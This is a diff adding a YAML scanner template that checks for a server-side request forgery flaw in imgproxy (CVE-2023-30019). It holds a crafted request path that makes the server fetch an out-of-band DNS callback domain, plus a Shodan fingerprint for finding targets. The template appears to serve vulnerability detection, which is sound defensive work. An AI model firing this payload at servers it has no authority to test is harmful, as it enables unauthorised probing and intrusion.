@@ -1,0 +1,26 @@
+id: poc-yaml-imgproxy-ssrf
+info:
+  name: imgproxy 服务器端请求伪造漏洞(CVE-2023-30019)
+  severity: medium
+  tags:
+  - DNSLOG
+  - ssrf
+  - CVE-2023-30019
+  finger: imgproxy
+  shodan: 'Server: imgproxy'
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: GET
+  path: /111/rs:fit:400:400:0:0/plain/http://{{.reverseDomain}}
+  expression: 'status_code == 404
+
+    && contains(headers,"imgproxy")
+
+    && contains(body,"Source image is unreachable")
+
+    && reverse.Verify()
+
+    '
+transport: http
